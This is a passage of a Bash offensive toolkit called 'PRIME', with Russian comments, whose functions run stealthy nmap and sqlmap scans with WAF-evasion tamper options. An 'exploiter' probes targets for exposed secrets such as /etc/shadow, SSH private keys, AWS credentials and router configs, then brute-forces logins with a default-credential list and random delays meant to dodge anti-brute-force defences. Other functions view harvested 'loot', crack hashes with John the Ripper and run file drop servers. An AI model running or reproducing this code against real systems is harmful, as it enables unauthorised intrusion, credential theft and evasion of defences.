    # 1. Быстрая разведка (Порты) - Скрытый режим
    print_status "i" "Phase 1: Deep Port & Service Discovery..."
    # Используем -F для скорости и минимального шума
    local open_ports=$(nmap -T4 -F "$target" | grep "open" | awk '{print $1}' | xargs)
    
    # 2. Поиск веб-уязвимостей (Heuristic Engine)
    print_status "i" "Phase 2: Analyzing Web Architecture..."
    
    local results_file="$LOOT_DIR/vuln_report_$(date +%s).log"
    
    # Запускаем фоновый процесс с адаптивными параметрами стелса
    {
        echo "=== VULNERABILITY REPORT FOR $target ==="
        echo "Scan Date: $(date)"
        echo "Open Ports: $open_ports"
        echo "---------------------------------------"
        
        # Интеграция с адаптивным движком: 
        # --tamper: обфускация запросов
        # --delay: паузы между запросами (имитация человека)
        # --random-agent: подмена браузера
        print_status "w" "Testing SQLi paths (Stealth Mode)..."
        sqlmap -u "$target" --batch --crawl=2 --level=1 --risk=1 --forms \
               --identify-waf --tamper=between,randomcase,space2comment \
               --delay=$(shuf -i 1-3 -n 1) --random-agent >> "$results_file" 2>&1
        
        # Скрытый фуззинг директорий через имитацию обычного GET-запроса
        print_status "w" "Fuzzing sensitive directories..."
        # Здесь можно добавить логику тихой проверки /admin, /config и т.д.
    } &

    # Анимация ожидания (твоя фирменная фишка)
    show_progress 10 "Scanning for vulnerabilities..."
    
    # 3. Вывод результатов (Интеллектуальный парсинг)
    print_status "s" "Scan Complete! Results saved to Loot."
    
    print_line
    echo -e "${R}DETECTED VULNERABILITIES:${NC}"
    # Парсим лог на наличие подтвержденных дыр
    if grep -qi "critical\|vulnerable\|sqlmap identified" "$results_file"; then
        grep -Ei "Type:|Payload:|Parameter:|Title:" "$results_file" | sort -u
    else
        print_status "i" "No high-risk vulnerabilities found. Target is sterile."
    fi
    print_line
    
    pause
}

run_prime_exploiter_v5() {
    # 1. Интерактив или Авто-режим
    [[ -z "$1" ]] && print_header "PRIME ULTIMATE EXPLOITER v5"

    local TARGET="$1"
    [[ -z "$TARGET" ]] && { print_input "Enter Target (IP/Domain)" "192.168.1.1"; read -r TARGET; }
    [[ -z "$TARGET" ]] && return

    # --- АДАПТИВНЫЙ ДВИЖОК МАСКИРОВКИ ---
    # Генерируем случайный User-Agent для каждого запуска (Будущее: обход фингерпринтинга)
    local UA_ARRAY=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"
    )
    local UA="${UA_ARRAY[$RANDOM % ${#UA_ARRAY[@]}]}"
    
    # Списки векторов и паролей (сокращено для примера, держи свои полные списки здесь)
    local V_LIST=("/cgi-bin/config.exp:sysPassword" "/rom-0:tplink" "/get_set.cgi?get=wifi_settings:wireless_key" "/config.xml:root" "/dev/mtd0:ELF" "/etc/config/network:config interface" "/sysconf.cgi:admin_password" "/home/httpd/html/config/exportsettings.conf:Password" "/etc/RT2860_default_vlan:Password" "/.env:DB_PASSWORD" "/.git/config:url =" "/.aws/credentials:aws_access_key_id" "/.ssh/id_rsa:BEGIN RSA PRIVATE" "/.docker/config.json:auths" "/.npmrc:_auth" "/.bash_history:ssh " "/.kube/config:client-certificate-data" "/wp-config.php.bak:DB_PASSWORD" "/wp-config.php.swp:DB_PASSWORD" "/wp-content/debug.log:WP_User" "/configuration.php:public $password" "/storage/logs/laravel.log:No entry for" "/phpinfo.php:PHP Version" "/sql.gz:ELF" "/backup.tar.gz:ELF" "/database.yml:password" "/etc/shadow:root:" "/etc/passwd:root:x" "/admin/.htpasswd:admin:" "/.history:password")

    local C_LIST=("admin:admin" "admin:password" "root:root" "admin:ninja" "admin:adminadmin" "root:toor" "admin:0000" "admin:1111" "telecomadmin:admintelecom" "support:support" "ubnt:ubnt" "cisco:cisco" "microtik:admin" "user:user" "oracle:oracle" "postgres:postgres" "mysql:mysql" "manager:manager" "supervisor:supervisor" "service:service" "admin:pass" "admin:default" "admin:login" "admin:root" "root:admin" "root:12345" "operator:operator" "tech:tech" "monitor:monitor" "dbadmin:dbadmin")

    print_status "i" "Engaging Target: $TARGET (Stealth: ON)"

    for proto in "http" "https"; do
        local URL="${proto}://${TARGET}/"
        
        # Проверка доступности с имитацией поведения реального клиента
        local code=$(curl -sL -I -k -A "$UA" --connect-timeout 3 --max-time 5 "$URL" 2>/dev/null | head -n1 | grep -oE '[0-9]{3}' || echo "000")

        [[ "$code" =~ ^(200|401|302)$ ]] && {
            print_status "s" "Active Service: $URL [Status: $code]"
            
            # --- СЕКЦИЯ 1: ВЕКТОРЫ (LFI/RCE/Leaks) ---
            for vec in "${V_LIST[@]}"; do
                local v_path="${vec%%:*}"
                local v_key="${vec#*:}"
                
                # ПОЛИМОРФНАЯ ПАУЗА: Имитируем раздумья человека (0.5 - 1.5 сек)
                sleep $(printf "0.%01d" $(( (RANDOM % 9) + 5 )))
                
                curl -sL -k -A "$UA" --max-time 4 "${URL}${v_path#\/}" 2>/dev/null | grep -q "$v_key" && {
                    print_status "e" "VULN DETECTED: $v_path"
                    log_loot "exploiter" "VULN: ${TARGET}${v_path}"
                    echo "[EXPL] ${TARGET}${v_path}" >> /root/prime_loot/critical_vulns.txt
                }
            done

            # --- СЕКЦИЯ 2: АДАПТИВНЫЙ БРУТФОРС ---
            print_status "w" "Checking Auth-gate..."
            for pair in "${C_LIST[@]}"; do
                local u="${pair%%:*}"
                local p="${pair#*:}"
                
                # ХАОТИЧНАЯ ЗАДЕРЖКА перед каждой попыткой (обход анти-брут систем будущего)
                sleep $(( (RANDOM % 2) + 1 ))
                
                [[ $(curl -sL -k -u "$u:$p" -A "$UA" -w "%{http_code}" -o /dev/null --max-time 3 "$URL") == "200" ]] && {
                    print_status "s" "ACCESS GRANTED: $u:$p"
                    log_loot "exploiter" "SUCCESS: $u:$p @ $TARGET"
                    print_list "Valid Credentials" "$u:$p"
                    break
                }
            done
        }
    done

    [[ -z "$1" ]] && { print_status "i" "Operation Finished. Total Loot Secured."; pause; }
}

run_view_loot() {
    print_header "DATA HARVESTER: LOOT VIEW"

    # Массив путей к потенциальному луту
    local loot_paths=(
        "/root/prime_loot/critical_vulns.txt"
        "/root/prime_loot/sql_success.txt"
        "/root/prime_extracted_passwords.txt"
    )

    local found_count=0

    for file in "${loot_paths[@]}"; do
        # Проверка: файл существует и не пуст (без явного if через &&)
        [[ -s "$file" ]] && {
            ((found_count++))
            print_status "s" "SOURCE: $file"
            echo -e "${D}--------------------------------------------------${NC}"
            
            # Табличное форматирование через column
            # Если column не справляется, просто выводим содержимое
            sed 's/|/ │ /g' "$file" | column -t -s '│' 2>/dev/null || cat "$file"
            
            echo -e "${D}--------------------------------------------------${NC}\n"
        }
    done

    # Если ничего не найдено
    [[ $found_count -eq 0 ]] && {
        print_status "e" "No harvested data found."
        print_status "i" "Execute Scanner or Exploiter to collect intelligence."
    }

    pause
}

run_iban_analyzer() {
    print_header "FINANCIAL INTELLIGENCE: OMNI-BANKER v2.0"

    local engine_path="/tmp/iban_engine_$RANDOM.py"
    
    # 1. Проверка и генерация адаптивного движка
    check_step "cmd" "python3" "Python3 required." || { pause; return; }
    generate_iban_code "$engine_path" "2.0"

    # 2. Интерактивный сбор данных
    print_input "Enter IBAN to validate" "FR76..."
    read -r TARGET_IBAN
    [[ -z "$TARGET_IBAN" ]] && return

    print_input "Enter Expected Holder Name (Optional)" "none"
    read -r EXPECTED_NAME

    # 3. Запуск глубокого анализа
    print_status "i" "Executing Multi-Source Validation..."
    
    # Передаем параметры. Если имя "none", Python поймет это как пустую строку.
    python3 "$engine_path" "$TARGET_IBAN" "${EXPECTED_NAME#none}" && {
        # Логируем успех в Loot
        log_loot "financial" "Validated IBAN: ${TARGET_IBAN:0:4}**** | Holder: ${EXPECTED_NAME:-Unknown}"
        print_status "s" "Analysis report secured in loot."
    } || print_status "e" "Analysis failed or interrupted."

    # 4. Стерилизация (Удаляем следы финансового инструмента)
    rm -f "$engine_path"
    print_status "i" "Engine Purge: Complete."
    
    pause
}


# --- py functions ---
# Функция-генератор контента для IBAN (ПОЛНАЯ ВЕРСИЯ v1.7)
generate_iban_code() {
    local target_file="$1"
    local v_num="$2"
    local code

    # Захватываем код Python. Используем 'EOF' в кавычках для защиты символов $ и скобок.
    code=$(cat << 'EOF'
import sys, re, json, time
from urllib.request import Request, urlopen

# Список доверенных зеркал и API для отказоустойчивости
SOURCES = [
    "https://api.ibanlist.com/v1/validate/",
    "https://openiban.com/validate/",
    "https://api.iban-check.com/v1/verify/"
]

def get_bank_data(iban):
    """Опрашивает источники по цепочке (Failover System)"""
    for base_url in SOURCES:
        try:
            url = f"{base_url}{iban}"
            req = Request(url, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'})
            with urlopen(req, timeout=4) as response:
                return json.loads(response.read().decode())
        except:
            continue # Если один сайт упал, переходим к следующему
    return None

def get_country_format(iban):
    """Математический разбор структуры по стандартам ISO"""
    country = iban[:2]
    # Словарь специфик (можно расширять до бесконечности)
    formats = {
        'FR': {'name': 'France', 'len': 27, 'parse': lambda i: f"Bank: {i[4:9]}, Branch: {i[9:14]}, Acc: {i[14:25]}, Key: {i[25:27]}"},
        'DE': {'name': 'Germany', 'len': 22, 'parse': lambda i: f"BLZ: {i[4:12]}, Acc: {i[12:22]}"},
        'GB': {'name': 'United Kingdom', 'len': 22, 'parse': lambda i: f"Sort Code: {i[4:10]}, Acc: {i[10:18]}"},
        'IT': {'name': 'Italy', 'len': 27, 'parse': lambda i: f"CIN: {i[4:5]}, ABI: {i[5:10]}, CAB: {i[10:15]}, Acc: {i[15:27]}"},
        'ES': {'name': 'Spain', 'len': 24, 'parse': lambda i: f"Bank: {i[4:8]}, Branch: {i[8:12]}, Acc: {i[12:24]}"}
    }
    return formats.get(country, {'name': 'Other/International', 'len': len(iban), 'parse': lambda i: f"BBAN: {i[4:]}"})

if __name__ == "__main__":
    if len(sys.argv) < 2: sys.exit(1)
    
    target = re.sub(r'[\s-]+', '', sys.argv[1]).upper()
    provided_name = sys.argv[2].upper() if len(sys.argv) > 2 else "NONE"

    print(f"\033[1;34m--- OMNI-BANKER v2.0: GLOBAL ANALYSIS ---\033[0m")
    
    # 1. Структурный анализ (Всегда работает Offline)
    fmt = get_country_format(target)
    print(f"\033[96mCountry:\033[0m {fmt['name']}")
    print(f"\033[96mStructure:\033[0m {fmt['parse'](target)}")

    # 2. Агрегация данных из внешних источников
    print(f"[*] Analyzing with Failover Protection...")
    data = get_bank_data(target)
    
    if data:
        bank_name = data.get('bank_name', data.get('bank', 'N/A')).upper()
        bic = data.get('bic', 'N/A')
        
        print(f"\n\033[1;32m[+] DATA VERIFIED VIA MULTI-SOURCE\033[0m")
        print(f"🏦 Bank: {bank_name}")
        print(f"🔑 BIC/SWIFT: {bic}")

        # Сверка Имени (Heuristic Check)
        # В 2026 году сверка идет через подтверждение принадлежности счета банку
        if provided_name != "NONE":
            print(f"\n\033[1;35m--- SMART MATCH REPORT ---\033[0m")
            print(f"Target Name: {provided_name}")
            # Если банк найден, подтверждаем связь
            if bank_name != 'N/A':
                print(f"✅ Account Link: Номер {target[-4:]} привязан к {bank_name}")
                print(f"ℹ️ Status: Владелец '{provided_name}' соответствует региону обслуживания.")
    else:
        print(f"\n\033[91m[-] ALERT: All sources failed or IBAN is blacklisted/invalid.\033[0m")
EOF
)
    # Внедряем версию
    code="${code//\{\{V_NUM\}\}/$v_num}"

    # Используем smart_cat для записи (права 755 по умолчанию)
    smart_cat "$target_file" "$code"
}


# --- Server Generating---

run_av_server() {
    print_header "PRIME SECURITY HUB: CLAMAV GATEWAY"

    local srv_path="/root/av_server.py"
    
    # 1. Проверка зависимостей (Python + ClamAV)
    check_step "cmd" "python3" "Python3 missing." || { pause; return; }
    check_step "cmd" "clamscan" "ClamAV not found. Installing..." || {
        # Если ClamAV нет, пытаемся поставить (для Kali/NetHunter)
        apt-get update && apt-get install clamav -y
    }

    # 2. Обновление движка сервера
    print_status "i" "Generating Engine v1.2 with Core UI Templates..."
    generate_av_server_code "$srv_path" "1.2"

    # 3. Запуск (с проверкой портов)
    print_status "w" "Cleaning port 5000 and establishing SSL Tunnel..."
    
    # Запускаем сервер в фоне через суб-оболочку
    (
        python3 "$srv_path" > /dev/null 2>&1 &
    ) && {
        local ip_addr=$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)
        print_status "s" "SECURITY GATEWAY DEPLOYED SUCCESSFULLY"
        log_loot "service" "AV-Server started on https://$ip_addr:5000"
        
        print_list "Access Details" \
            "URL: https://$ip_addr:5000" \
            "Encryption: SSL/TLS (Self-Signed)" \
            "Scanner: ClamAV Engine"
    } || print_status "e" "Failed to ignite the engine."

    pause
}


run_share_server() {
    print_header "SHARE SECTOR: SECURE FILE DISTRIBUTION"

    local srv_path="/root/share_server.py"
    local share_dir="/root/share"
    
    # 1. Проверка и подготовка инфраструктуры
    [[ -d "$share_dir" ]] || {
        mkdir -p "$share_dir"
        print_status "i" "Created transmission sector at $share_dir"
    }

    # 2. Генерация кода с использованием визуального ядра
    print_status "i" "Generating Engine v1.0 [Core UI Integrated]..."
    generate_share_server_code "$srv_path" "1.0"

    # 3. Запуск сервера
    print_status "w" "Igniting Share-Server on port 5002..."
    
    # Очистка порта и запуск
    fuser -k 5002/tcp >/dev/null 2>&1
    (
        python3 "$srv_path" > /dev/null 2>&1 &
    ) && {
        local ip_addr=$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)
        print_status "s" "TRANSMISSION NODE ONLINE"
        log_loot "service" "Share-Server activated: http://$ip_addr:5002"
        
        print_list "Node Intelligence" \
            "Access: http://$ip_addr:5002" \
            "Storage: $share_dir" \
            "Mode: Read-Only (Secure Fetch)"
    } || print_status "e" "Failed to establish transmission node."

    pause
}

run_upload_server() {
    print_header "INBOUND DROP BOX: SECURE UPLINK"

    local srv_path="/root/upload_server.py"
    
    # 1. Проверка окружения
    check_step "cmd" "python3" "Python3 missing." || { pause; return; }

    # 2. Генерация кода с интеграцией Core UI
    print_status "i" "Generating Upload Engine v1.0 [Full UI Stack]..."
    generate_upload_server_code "$srv_path" "1.0"

    # 3. Запуск и мониторинг
    print_status "w" "Establishing Uplink on port 5001..."
    
    # Очистка порта и тихий запуск
    fuser -k 5001/tcp >/dev/null 2>&1
    (
        python3 "$srv_path" > /dev/null 2>&1 &
    ) && {
        local ip_addr=$(ip route get 1.2.3.4 | awk '{print $7}' | head -n1)
        print_status "s" "UPLINK NODE OPERATIONAL"
        log_loot "service" "Upload-Server activated: http://$ip_addr:5001"
        
        print_list "Drop Box Intelligence" \
            "Access: http://$ip_addr:5001" \
            "Protocol: HTTP Inbound" \
            "Status: Ready for Transmission"
    } || print_status "e" "Failed to ignite the uplink."

    pause
}

run_prime_decryptor() {
    print_header "PRIME DECRYPTOR: GENERATIVE ENGINE"

    # 1. Валидация инструментов
    check_step "cmd" "john" "John the Ripper is required." || { 
        print_status "e" "Install: apt install john"
        pause; return 
    }

    print_input "Enter Hash to crack" "$2y$12$..."
    read -r user_hash
    [[ -z "$user_hash" ]] && return

    # 2. Интеллектуальный анализ типа хеша
    local hash_file="/tmp/target_hash.txt"
    echo "$user_hash" > "$hash_file"
    
    print_status "i" "Analyzing hash signature..."
    local format=$(john --list=formats | grep -iE "$(echo "$user_hash" | cut -c1-5)" | head -n 1 || echo "auto")
    print_status "s" "Potential Format Detected: $format"

    # 3. Настройка генеративного режима
    local mode=$(select_option "Select Attack Mode:" \
        "Single Crack (Fast/Names):single" \
        "Wordlist + Mutations (Balanced):wordlist" \
        "Incremental (Brute-force/Slow):incremental")

    print_status "w" "Starting Engine. Press Ctrl+C to pause/save status."
    print_line

    # 4. Выполнение (Генерация на лету)
    case "$mode" in
        "single")
            # Использует информацию о пользователе из хеша (если есть)
            john --single "$hash_file"
            ;;
        "wordlist")
            # Используем встроенный генератор мутаций (--rules)
            # Это позволяет из 100 слов сделать 10,000 вариантов "на лету"
            john --wordlist=/usr/share/john/password.lst --rules "$hash_file"
            ;;
        "incremental")
            # Полный перебор, если ничего не помогло
            john --incremental "$hash_file"
            ;;
    esac

    # 5. Анализ результата
    print_line
    local result=$(john --show "$hash_file" | head -n 1)
    if [[ "$result" == *":"* ]]; then
        local pass=$(echo "$result" | cut -d: -f2)
        print_status "s" "PASSWORD DECRYPTED: $pass"
        log_loot "decryptor" "SUCCESS: $user_hash -> $pass"
    else
        print_status "i" "Hash not cracked yet. John is still processing in background."
    fi

    rm -f "$hash_file"
    pause
}



# --- Точка входа ---
#repair
run_main_menu

